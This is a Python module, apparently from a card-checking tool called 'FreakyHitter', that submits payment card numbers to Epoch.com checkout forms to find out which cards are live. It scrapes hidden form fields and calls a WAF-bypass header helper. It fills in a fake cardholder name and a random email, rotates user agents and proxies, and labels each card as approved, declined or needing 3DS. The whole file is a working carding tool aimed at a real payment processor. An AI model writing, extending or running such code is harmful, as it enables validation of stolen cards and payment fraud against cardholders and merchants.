"""
Epoch hitter for FreakyHitter integration.
Targets Epoch.com (CCBill-adjacent) adult content payment processor.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urlencode, urljoin, parse_qs, urlunparse

from .waf_solver import get_bypass_headers
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
]

EPOCH_DOMAINS = ["epoch.com", "buy.epoch.com", "secure.epoch.com"]


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


def _random_email() -> str:
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    return f"{name}@{random.choice(domains)}"


async def _get_epoch_form(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Get the Epoch payment form fields and action URL."""
    form_info = {"action": None, "hidden_fields": {}, "pi_code": None}
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")
            final_url = str(resp.url)

        # Get form action
        form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if form_action:
            action = form_action.group(1)
            if action.startswith("/"):
                parsed = urlparse(final_url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            form_info["action"] = action

        # Get all hidden fields
        hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', html, re.IGNORECASE)
        alt_hidden = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']*)["\']', html, re.IGNORECASE)
        for name, value in hidden + alt_hidden:
            form_info["hidden_fields"][name] = value

        # PI code (Epoch specific)
        pi = re.search(r'(?:pi_code|piCode|joinByCC)["\s:\'=]+([A-Za-z0-9\-_]{6,})', html)
        if pi:
            form_info["pi_code"] = pi.group(1)

        # Try join endpoint extraction
        join_url = re.search(r'action=["\']([^"\']*joinByCC[^"\']*)["\']', html, re.IGNORECASE)
        if join_url:
            form_info["action"] = join_url.group(1)
            if not form_info["action"].startswith("http"):
                parsed = urlparse(final_url)
                form_info["action"] = f"{parsed.scheme}://{parsed.netloc}{form_info['action']}"

    except Exception:
        pass
    return form_info


async def hit_epoch(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Hit an Epoch.com powered checkout page."""
    start = time.time()

    parsed_card = parse_card(card_str)
    if not parsed_card:
        return {"status": "error", "message": "Invalid card format", "gateway": "Epoch", "time_taken": 0}

    cc, mm, yy, cvv = parsed_card
    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)
    connector = create_connector()

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        form_info = await _get_epoch_form(session, url, proxy)

        action_url = form_info.get("action") or url
        hidden_fields = form_info.get("hidden_fields", {})

        # Build form data
        parsed_url = urlparse(url)
        base = f"{parsed_url.scheme}://{parsed_url.netloc}"

        form_data = {
            **hidden_fields,
            "cardnum": cc,
            "ccnum": cc,
            "cardnumber": cc,
            "cnum": cc,
            "expmo": mm.zfill(2),
            "exp_month": mm.zfill(2),
            "expyr": str(exp_year)[-2:],
            "exp_year": str(exp_year)[-2:],
            "cvv": cvv,
            "cvv2": cvv,
            "cvc": cvv,
            "email": _random_email(),
            "fname": "John",
            "lname": "Doe",
            "name": "John Doe",
            "cardholder": "John Doe",
        }

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base,
            "Referer": url,
        }

        try:
            async with session.post(
                action_url,
                data=form_data,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30),
                allow_redirects=True,
            ) as resp:
                text = await resp.text(errors="ignore")
                status_code = resp.status
                final_url = str(resp.url)
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Request timed out", "gateway": "Epoch", "time_taken": round(time.time() - start, 2)}
        except Exception as e:
            return {"status": "error", "message": str(e)[:100], "gateway": "Epoch", "time_taken": round(time.time() - start, 2)}

    time_taken = round(time.time() - start, 2)
    result = _classify_epoch_response(text, status_code, final_url)
    result["gateway"] = "Epoch"
    result["time_taken"] = time_taken
    return result


def _classify_epoch_response(text: str, status_code: int, final_url: str) -> Dict[str, str]:
    lower = text.lower()
    url_lower = final_url.lower()

    if any(k in url_lower for k in ["success", "approved", "thank", "confirmation"]):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(k in lower for k in ["approved", "success", "thank you", "welcome", "order confirmed", "payment successful"]):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(k in lower for k in ["declined", "refused", "invalid card", "card error", "insufficient", "do not honor"]):
        return {"status": "decline", "message": "Card Declined ❌"}
    if any(k in lower for k in ["3d secure", "authentication required", "verify", "redirect"]):
        return {"status": "3ds", "message": "3DS Required 🔐"}
    if any(k in url_lower for k in ["decline", "error", "fail"]):
        return {"status": "decline", "message": "Payment Failed ❌"}

    if status_code in (200, 201) and len(text) > 200:
        return {"status": "live", "message": "Processed ✅"}

    return {"status": "decline", "message": f"Unknown Response ⚠️"}
